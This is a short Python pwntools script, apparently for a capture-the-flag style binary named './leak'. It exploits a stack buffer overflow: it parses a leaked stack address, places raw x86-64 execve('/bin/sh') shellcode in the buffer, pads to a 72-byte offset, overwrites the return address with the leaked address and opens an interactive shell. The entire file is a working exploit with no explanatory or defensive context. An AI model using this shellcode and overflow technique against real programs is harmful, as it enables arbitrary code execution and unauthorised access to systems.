#!/usr/bin/env python3

from pwn import *

s = process('./leak')

context(os='linux',arch='amd64')

#shellcode = asm(shellcraft.sh())
shellcode=b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
leak_addr = int(s.recvline()[19:],16)
offset = 72

payload = shellcode
payload += b"A"*(offset-len(shellcode))
payload += p64(leak_addr)

s.sendline(payload)
s.interactive()
